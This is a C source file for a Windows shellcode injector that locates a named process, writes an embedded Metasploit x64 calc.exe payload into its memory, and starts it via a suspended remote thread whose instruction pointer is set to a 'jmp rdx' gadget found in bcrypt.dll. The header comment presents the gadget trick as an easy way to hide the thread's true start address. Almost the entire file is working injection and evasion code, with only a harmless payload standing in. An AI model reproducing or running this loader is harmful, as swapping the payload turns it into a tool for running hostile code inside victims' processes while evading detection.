/*
*
* Original idea: Test JMP RCX rop gadget to jump to our shellcode from a
* legit image. But all create thread functions gives stack overrun if set
* the rop as start address.
*
* Work around: Create a thread suspended, still pass the payload address
* as lpParameter, but it will be in RDX; so, instead of searching for
* jmp rcx (ff e1), have to search for jmp rdx (ff e2). Then, set the
* start address using CONTEXT.Rip, resume the thread.
*
* bcrypt.dll has the jmp rdx gadget, and this dll can be found in edge,
* explorer, notepad ... So, it's fairly easily to exploit.
*
*/

#include <windows.h>
#include <stdio.h>
#include <winternl.h>	// for RtlCreateUserThread
#include <Tlhelp32.h>

// comment out to suppress output
//
#define _DBG

#ifdef _DBG
#define DEBUG_PRINT(x, ...) printf(x, ##__VA_ARGS__)
#define _INT getchar()
#else
#define DEBUG_PRINT(x, ...)
#define _INT
#endif

//x64 calc metasploit shellcode 
unsigned char payload[] = {
	0x90, 0x90, 0x90, 0x90, 0x90, 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00, 0x90, 0xcc
};

// get target process handle using snapshot method
BOOL GetRemoteProcHandle(_In_ LPWSTR szProcessName, _Out_ DWORD* dwProcId, _Out_ HANDLE* hProc)
{
	HANDLE hSnapShot = NULL;
	PROCESSENTRY32 stProc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (INVALID_HANDLE_VALUE == hSnapShot)
	{
		DEBUG_PRINT("[*]CreateToolhelp32Snapshot failed with error: 0x%.8x\n", GetLastError());
		goto _endfunc;
	}

	if (!Process32First(hSnapShot, &stProc))
	{
		DEBUG_PRINT("[-]Process32First failed with error: 0x%.8x\n", GetLastError());
		goto _endfunc;
	}

	do
	{
		WCHAR lowerName[MAX_PATH * 2];

		if (stProc.szExeFile)
		{
			DWORD dwSize = lstrlenW(stProc.szExeFile);
			DWORD i = 0;

			RtlSecureZeroMemory(lowerName, MAX_PATH * 2);

			if (dwSize < MAX_PATH * 2)
			{
				for (; i < dwSize; i++)
					lowerName[i] = (WCHAR)tolower(stProc.szExeFile[i]);

				lowerName[i++] = '\0';
			}
		}

		if (0 == wcscmp(lowerName, szProcessName))
		{
			*dwProcId = stProc.th32ProcessID;
			*hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, stProc.th32ProcessID);
			if (NULL == *hProc)
				DEBUG_PRINT("[-]OpenProcess failed with error: 0x%.8x\n", GetLastError());
			break;
		}
	} while (Process32Next(hSnapShot, &stProc));

_endfunc:
	if (NULL != hSnapShot)
		CloseHandle(hSnapShot);
	if (NULL == *dwProcId || NULL == *hProc)
		return FALSE;

	return TRUE;
}

// inject shellcode into remote process
BOOL InjectRemoteProc(_In_ HANDLE hProc, _In_ PBYTE pShellcode, _In_ SIZE_T sShellcod, _Out_ PVOID* ppAddr)
{
	SIZE_T sNumberOfBytesWritten = NULL;
	DWORD dwOldProtection = NULL;

	*ppAddr = VirtualAllocEx(hProc, NULL, sShellcod, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (NULL == *ppAddr)
	{
		DEBUG_PRINT("[-]VirtualAllocEx failed with error: %d\n", GetLastError());
		return FALSE;
	}

	DEBUG_PRINT("[+]Payload buffer address @ ==========> 0x%p\n", *ppAddr);

	DEBUG_PRINT("[*]Press <Enter> to write payload ..");
	_INT;

	if (!WriteProcessMemory(hProc, *ppAddr, pShellcode, sShellcod, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sShellcod)
	{
		DEBUG_PRINT("[-]WriteProcessMemory failed with error: 0x%.8x\n", GetLastError());
		return FALSE;
	}

	DEBUG_PRINT("[*]Done ... %d bytes of payload written ...\n", sNumberOfBytesWritten);

	if (!VirtualProtectEx(hProc, *ppAddr, sShellcod, PAGE_EXECUTE_READWRITE, &dwOldProtection))
	{
		DEBUG_PRINT("[-]VirtualProtectEx failed with error: 0x%.8x\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

// perform thread hijacking
BOOL Rop(_In_ HANDLE hProc, _In_ PVOID pAddr)
{
	PVOID pLegitBase = NULL;
	PVOID rop = NULL;
	DWORD dwThrdId = 0x0;
	HANDLE hThrd = INVALID_HANDLE_VALUE;

	// find a legit image to rop, get base address
	pLegitBase = (PVOID)LoadLibraryA("bcrypt.dll");

	if (NULL == pLegitBase)
	{
		DEBUG_PRINT("[-]Failed to load image ...\n");
		return FALSE;
	}

	for (DWORD i = 0; i + 1 < 100000 && rop == NULL; i++)
	{
		if (((PCHAR)pLegitBase)[i] == '\xff' && ((PCHAR)pLegitBase)[i + 1] == '\xe2')
			rop = (PVOID)((PCHAR)pLegitBase + i);
	}

	if (NULL == rop)
	{
		DEBUG_PRINT("[-]Cannot find rop gadget ...\n");
		return FALSE;
	}

	DEBUG_PRINT("[+]ROP jmp rdx found @ ===========> 0x%p\n", rop);
	DEBUG_PRINT("[*]Press <Enter> to create thread ...");
	_INT;

	if (NULL == (hThrd = CreateRemoteThread(hProc, NULL, NULL, NULL, pAddr, CREATE_SUSPENDED, &dwThrdId)))
	{
		DEBUG_PRINT("[-]Create thread fialed with error: 0x%.8x\n", GetLastError());
		return FALSE;
	}

	CONTEXT ctx = {
		.ContextFlags = CONTEXT_ALL
	};

	if (!GetThreadContext(hThrd, &ctx))
	{
		DEBUG_PRINT("[-]Failed to get context with error: 0x%.8x\n", GetLastError());
		return FALSE;
	}

	ctx.Rip = (DWORD64)rop;

	if (!SetThreadContext(hThrd, &ctx))
	{
		DEBUG_PRINT("[-]Failed to set context with error: 0x%.8x\n", GetLastError());
		return FALSE;
	}

	DEBUG_PRINT("[*]Thread created with ID: %d\n", dwThrdId);
	DEBUG_PRINT("[*]Press <Enter> to resume thread ...");
	_INT;

	ResumeThread(hThrd);

	DEBUG_PRINT("[*]Check ...");
	_INT;

	return TRUE;
}

int wmain(int argc, wchar_t** argv)
{
	HANDLE hProc = NULL;
	DWORD dwProcId = NULL;
	PVOID pAddr = NULL;

	if (argc < 2)
	{
		DEBUG_PRINT(L"[-]Usage: \"%ws\" <Process Name> \n", argv[0]);
		return -1;
	}

	DEBUG_PRINT("[*]Trageting process: \"%ws\" ...\n", argv[1]);

	if (!GetRemoteProcHandle(argv[1], &dwProcId, &hProc))
	{
		DEBUG_PRINT("[-]Process not found ...\n");
		return -1;
	}

	DEBUG_PRINT("[+]Found target process @ ==========> %d\n", dwProcId);

	DEBUG_PRINT("[*]Inject shellcode ...\n");

	if (!InjectRemoteProc(hProc, payload, sizeof(payload), &pAddr))
	{
		DEBUG_PRINT("[-]Inject shellcode failed ...\n");
		return -1;
	}

	DEBUG_PRINT("[*]Rop execute ... \n");

	if (!Rop(hProc, pAddr))
	{
		DEBUG_PRINT("[-]Rop execute failed ...\n");
		return -1;
	}

	DEBUG_PRINT("[*]DONE ...\n");

	CloseHandle(hProc);

	DEBUG_PRINT("[*]Press <Enter> to quit ...");
	_INT;

	return 0;
}

